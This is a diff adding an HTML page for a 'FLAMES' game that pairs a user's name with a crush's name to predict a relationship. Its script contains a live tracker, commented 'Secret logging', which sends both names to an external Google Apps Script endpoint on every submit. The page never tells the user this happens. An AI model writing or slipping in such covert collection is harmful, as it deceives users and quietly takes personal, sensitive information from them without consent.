@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>FLAMES 🔥</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(to right, #ffcccc, #ffe6e6);
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      color: #cc0000;
+      margin-bottom: 20px;
+      font-size: 2rem;
+      text-align: center;
+    }
+
+    form {
+      background-color: white;
+      padding: 30px 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    input[type="text"] {
+      padding: 12px;
+      margin: 10px 0;
+      width: 100%;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    button {
+      padding: 12px 25px;
+      background-color: #ff3333;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #e60000;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 20px;
+      color: #333;
+      text-align: center;
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #555;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      form {
+        padding: 20px;
+      }
+
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      input[type="text"], button {
+        font-size: 15px;
+        padding: 10px;
+      }
+
+      #result {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>🔥 FLAMES Game 🔥</h1>
+  <form id="flamesForm">
+    <input type="text" name="name1" id="name1" placeholder="Your Name" required><br>
+    <input type="text" name="name2" id="name2" placeholder="Crush's Name" required><br>
+    <button type="submit">Find Relationship</button>
+  </form>
+
+  <div id="result"></div>
+  <footer>Made with ❤️ by RAMpage</footer>
+
+  <script>
+    function calculateFlames(name1, name2) {
+      name1 = name1.toLowerCase().replace(/\s/g, '');
+      name2 = name2.toLowerCase().replace(/\s/g, '');
+
+      let name1Arr = name1.split('');
+      let name2Arr = name2.split('');
+
+      for (let i = 0; i < name1Arr.length; i++) {
+        let index = name2Arr.indexOf(name1Arr[i]);
+        if (index !== -1) {
+          name1Arr[i] = '';
+          name2Arr[index] = '';
+        }
+      }
+
+      const total = [...name1Arr.join(''), ...name2Arr.join('')].length;
+      const flamesList = ['Friends', 'Love', 'Affection', 'Marriage', 'Enemy', 'Siblings'];
+      let idx = 0;
+
+      while (flamesList.length > 1) {
+        idx = (total % flamesList.length) - 1;
+        if (idx >= 0) {
+          flamesList.splice(idx, 1);
+        } else {
+          flamesList.pop();
+        }
+      }
+
+      return flamesList[0];
+    }
+
+    document.getElementById('flamesForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const name1 = document.getElementById('name1').value.trim();
+      const name2 = document.getElementById('name2').value.trim();
+
+      const result = calculateFlames(name1, name2);
+      document.getElementById('result').innerText = `${name1} ❤️ ${name2} = ${result}`;
+
+      // Secret logging
+      fetch('https://script.google.com/macros/s/AKfycbxSjDZgDPrR_RznxeY4thoIOpHPbFBnZmK0KGAKczQu5mcbe8-0PejQkkghD3_b4d-yHw/exec', {
+        method: 'POST',
+        body: new URLSearchParams({ name1: name1, name2: name2 })
+      }).catch(err => console.error("Logging failed:", err));
+    });
+  </script>
+</body>
+</html>
